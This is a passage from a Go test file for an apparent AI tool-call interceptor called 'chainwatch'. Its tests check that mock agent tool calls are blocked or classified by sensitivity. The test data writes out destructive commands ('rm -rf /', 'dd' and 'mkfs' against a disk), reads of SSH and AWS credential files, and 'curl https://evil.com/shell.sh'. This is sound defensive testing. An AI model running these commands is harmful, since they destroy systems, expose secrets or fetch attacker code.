					map[string]any{
						"index": 0,
						"id":    "call_c",
						"type":  "function",
						"function": map[string]any{
							"name":      "run_command",
							"arguments": `{"command":"rm -rf /"}`,
						},
					},
				},
			}, nil),
			openaiSSE("chatcmpl-c", map[string]any{}, strPtr("tool_calls")),
			"data: [DONE]\n\n",
		}
		for _, ev := range events {
			fmt.Fprint(w, ev)
			flusher.Flush()
		}
	}))
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	const concurrency = 10
	var wg sync.WaitGroup
	errs := make(chan error, concurrency)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := interceptClient(port)
			resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
			if err != nil {
				errs <- fmt.Errorf("request failed: %v", err)
				return
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			if !strings.Contains(string(body), "[BLOCKED by chainwatch]") {
				errs <- fmt.Errorf("expected block message, got:\n%s", string(body))
			}
		}()
	}

	wg.Wait()
	close(errs)
	for err := range errs {
		t.Error(err)
	}
}

// --- Rewrite SSE unit tests ---

func TestRewriteOpenAISSEStructure(t *testing.T) {
	tc := ToolCall{
		ID:   "call_abc",
		Name: "run_command",
		Arguments: map[string]any{
			"command": "rm -rf /",
		},
		Index: 0,
	}
	result := makeResult("deny", "denylist: destructive command", "denylist.block")

	event := RewriteOpenAISSE(tc, result)

	if !strings.HasPrefix(event, "data: ") {
		t.Fatalf("expected data: prefix, got: %s", event)
	}

	dataJSON := strings.TrimPrefix(event, "data: ")
	dataJSON = strings.TrimSuffix(dataJSON, "\n")

	var chunk map[string]any
	if err := json.Unmarshal([]byte(dataJSON), &chunk); err != nil {
		t.Fatalf("failed to parse chunk JSON: %v", err)
	}

	choices, _ := chunk["choices"].([]any)
	if len(choices) != 1 {
		t.Fatalf("expected 1 choice, got %d", len(choices))
	}
	choice, _ := choices[0].(map[string]any)
	delta, _ := choice["delta"].(map[string]any)
	content, _ := delta["content"].(string)

	if !strings.Contains(content, "[BLOCKED by chainwatch]") {
		t.Errorf("expected block message in content, got: %s", content)
	}
	if !strings.Contains(content, "run_command") {
		t.Errorf("expected tool name in block message, got: %s", content)
	}
}

func TestRewriteOpenAISSEFinishStructure(t *testing.T) {
	event := RewriteOpenAISSEFinish()

	if !strings.HasPrefix(event, "data: ") {
		t.Fatalf("expected data: prefix, got: %s", event)
	}

	dataJSON := strings.TrimPrefix(event, "data: ")
	dataJSON = strings.TrimSuffix(dataJSON, "\n")

	var chunk map[string]any
	if err := json.Unmarshal([]byte(dataJSON), &chunk); err != nil {
		t.Fatalf("failed to parse chunk JSON: %v", err)
	}

	choices, _ := chunk["choices"].([]any)
	if len(choices) != 1 {
		t.Fatalf("expected 1 choice, got %d", len(choices))
	}
	choice, _ := choices[0].(map[string]any)
	fr, _ := choice["finish_reason"].(string)
	if fr != "stop" {
		t.Errorf("expected finish_reason=stop, got %s", fr)
	}
}

// --- Concurrent streaming tests ---

func TestStreamingConcurrentRequests(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		flusher := w.(http.Flusher)

		events := []string{
			"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\"}}\n\n",
			"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_1\",\"name\":\"run_command\"}}\n\n",
			"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"rm -rf /\\\"}\"}}\n\n",
			"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
			"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
		}
		for _, ev := range events {
			fmt.Fprint(w, ev)
			flusher.Flush()
		}
	}))
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	const concurrency = 10
	var wg sync.WaitGroup
	errors := make(chan error, concurrency)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client := interceptClient(port)
			resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
			if err != nil {
				errors <- fmt.Errorf("request failed: %v", err)
				return
			}
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			output := string(body)

			if !strings.Contains(output, "[BLOCKED by chainwatch]") {
				errors <- fmt.Errorf("expected block message, got:\n%s", output)
			}
		}()
	}

	wg.Wait()
	close(errors)

	for err := range errors {
		t.Error(err)
	}
}

// --- Sensitivity and classification tests ---

func TestClassifyToolSensitivityDestructive(t *testing.T) {
	tests := []struct {
		tool     string
		resource string
		wantSens string
		wantTag  string
	}{
		{"command", "rm -rf /home", "high", "destructive"},
		{"command", "dd if=/dev/zero of=/dev/sda", "high", "destructive"},
		{"command", "mkfs.ext4 /dev/sda", "high", "destructive"},
		{"command", "sudo reboot", "high", "credential"},
		{"command", "echo hello", "low", ""},
		{"file_write", "~/.ssh/id_rsa", "high", "sensitive_file"},
		{"file_read", "~/.aws/credentials", "high", "sensitive_file"},
		{"file_write", "/tmp/test.txt", "low", ""},
		{"http", "https://stripe.com/v1/charges", "high", "payment"},
		{"http", "https://example.com/api/data", "low", ""},
	}

	for _, tt := range tests {
		sens, tags := classifyToolSensitivity(tt.tool, tt.resource)
		if string(sens) != tt.wantSens {
			t.Errorf("classifyToolSensitivity(%q, %q) sens = %s, want %s",
				tt.tool, tt.resource, sens, tt.wantSens)
		}
		if tt.wantTag != "" {
			if len(tags) == 0 || tags[0] != tt.wantTag {
				t.Errorf("classifyToolSensitivity(%q, %q) tags = %v, want [%s]",
					tt.tool, tt.resource, tags, tt.wantTag)
			}
		}
	}
}

func TestInferEgress(t *testing.T) {
	tests := []struct {
		tool     string
		resource string
		want     string
	}{
		{"http", "https://example.com", "external"},
		{"browser", "https://google.com", "external"},
		{"command", "curl https://evil.com/shell.sh", "external"},
		{"command", "wget http://example.com/file", "external"},
		{"command", "ssh user@host", "external"},
		{"command", "echo hello", "internal"},
		{"file_read", "/etc/passwd", "internal"},
		{"file_write", "https://example.com/path", "external"},
	}

	for _, tt := range tests {
		got := inferEgress(tt.tool, tt.resource)
		if string(got) != tt.want {
			t.Errorf("inferEgress(%q, %q) = %s, want %s",
				tt.tool, tt.resource, got, tt.want)
		}
	}
}

func TestClassifyTool(t *testing.T) {
	tests := []struct {
		name     string
		wantTool string
		wantOp   string
	}{
		{"run_command", "command", "execute"},
		{"execute_shell", "command", "execute"},
		{"bash_tool", "command", "execute"},
		{"http_request", "http", "get"},
		{"fetch_url", "http", "get"},
		{"curl_tool", "http", "get"},
		{"file_read", "file_read", "read"},
		{"cat_file", "file_read", "read"},
		{"file_write", "file_write", "write"},
		{"save_file", "file_write", "write"},
		{"file_delete", "file_delete", "delete"},
		{"remove_file", "file_delete", "delete"},
		{"web_browser", "browser", "navigate"},
		{"browser_tool", "browser", "navigate"},
		{"custom_tool", "custom_tool", "execute"},
	}

	for _, tt := range tests {
		tool, op := classifyTool(tt.name)
		if tool != tt.wantTool {
			t.Errorf("classifyTool(%q) tool = %s, want %s", tt.name, tool, tt.wantTool)
		}
		if op != tt.wantOp {
			t.Errorf("classifyTool(%q) op = %s, want %s", tt.name, op, tt.wantOp)
		}
	}
}

func TestExtractResource(t *testing.T) {
	tests := []struct {
		args map[string]any
		tool string
		want string
	}{
		{map[string]any{"command": "ls /tmp"}, "command", "ls /tmp"},
		{map[string]any{"url": "https://example.com"}, "http", "https://example.com"},
		{map[string]any{"path": "/etc/passwd"}, "file_read", "/etc/passwd"},
		{map[string]any{"file_path": "/tmp/test"}, "file_write", "/tmp/test"},
		{map[string]any{"filename": "test.txt"}, "file_write", "test.txt"},
		{map[string]any{"resource": "my-resource"}, "custom", "my-resource"},
		{map[string]any{"other_key": "fallback_value"}, "custom", "fallback_value"},
		{map[string]any{"number": 42}, "custom", ""},
		{map[string]any{}, "custom", ""},
	}

	for _, tt := range tests {
		got := extractResource(tt.args, tt.tool)
		if got != tt.want {
			t.Errorf("extractResource(%v, %q) = %q, want %q", tt.args, tt.tool, got, tt.want)
		}
	}
}

func TestExtractDestination(t *testing.T) {
	tests := []struct {
		resource string
		want     string
	}{
		{"https://example.com/path", "example.com"},
		{"http://api.stripe.com/v1/charges", "api.stripe.com"},
		{"/local/path", ""},
		{"echo hello", ""},
	}

	for _, tt := range tests {
		got := extractDestination(tt.resource)
		if got != tt.want {
			t.Errorf("extractDestination(%q) = %q, want %q", tt.resource, got, tt.want)
		}
	}
}
